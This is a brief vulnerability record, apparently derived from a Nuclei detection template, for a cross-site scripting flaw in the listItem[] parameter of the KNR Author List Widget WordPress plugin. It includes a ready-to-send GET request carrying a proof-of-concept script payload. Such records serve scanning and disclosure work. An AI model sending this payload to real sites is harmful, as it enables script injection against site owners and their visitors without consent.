# Vulnerability: KNR Author List Widget - Cross-site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`knr-widget-xss.yaml`)

## Description
KNR Author List Widget suffers from Cross-site Scripting (XSS) in the listItem[] parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/knr-author-list-widget/knrAuthorListCustomSortSave.php?listItem[]=<script>alert(document.domain)</script>
```

